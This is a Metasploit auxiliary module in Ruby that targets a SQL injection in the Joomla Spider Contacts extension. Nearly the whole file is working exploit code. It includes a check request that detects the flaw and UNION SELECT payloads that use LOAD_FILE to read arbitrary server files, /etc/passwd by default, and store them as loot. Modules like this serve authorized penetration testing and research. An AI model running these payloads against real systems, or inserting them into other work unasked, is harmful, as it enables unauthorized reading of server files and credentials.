##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla Spider Contacts SQL Injection Arbitrary File Read',
      'Description'    => %q{This module reads a file from the file system on vulnerable instances.

        This module exploits a SQL injection in version 1.3.6 and probably prior of
        Spider Contacts, a Joomla extension. In order to use this auxiliary module,
        the MySQL user performing the query that is vulnerable to injection must
        have the FILE permission set. This is often the case with misconfigured
        instances. The patched version did not seem to bump the version.
      },
      'References'     =>
        [
          ['EDB', 'http://www.exploit-db.com/exploits/34625/']
        ],
      'Author'         =>
        [
          'bperry',
          'Claudio Viviani' #discovery/poc
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => "Sep 11 2014"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to Joomla', '/']),
        OptString.new('FILEPATH', [true, 'The filepath to read on the server', '/etc/passwd'])
      ], self.class)
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "index.php?option=com_spidercontacts&contact_id=2'&view=showcontact&lang=ca")
    })

    if res and res.body.to_s =~ /Error: 500  SQL=SELECT/
        return Msf::Exploit::CheckCode::Vulnerable
    end

    Msf::Exploit::CheckCode::Safe
  end

  def run
    left_marker = "rewq".unpack('H*')[0]
    right_marker = "rewq".unpack('H*')[0]

    size_payload = "2 UNION ALL SELECT NULL,NULL,CONCAT(0x#{left_marker},IFNULL(CAST(LENGTH(LOAD_FILE(0x#{datastore['FILEPATH'].unpack('H*')[0]})) AS CHAR),0x20),0x#{right_marker}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => {
        'option' => 'com_spidercontacts',
        'contact_id' => size_payload,
        'view' => 'showcontact',
        'lang' => 'ca'
      }
    })

    res.body =~ /rewq(.*)rewq/
    length = $1

    file_payload = "2 UNION ALL SELECT NULL,NULL,CONCAT(0x#{left_marker},IFNULL(CAST(HEX(LOAD_FILE(0x#{datastore['FILEPATH'].unpack('H*')[0]})) AS CHAR),0x#{length.unpack('H*')[0]}),0x#{right_marker}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => {
        'option' => 'com_spidercontacts',
        'contact_id' => file_payload,
        'view' => 'showcontact',
        'lang' => 'ca'
      }
    })

    res.body =~ /rewq(.*)rewq/

    data = [$1].pack('H*')

    path = store_loot('joomla.file', 'binary/octet-stream', datastore['RHOST'], data, datastore['FILEPATH'])
    print_status ("File saved to #{path}.")
    print_status ("If the file is empty, the file may not exist on the server or the user does not have FILE permissions.")

  end
end

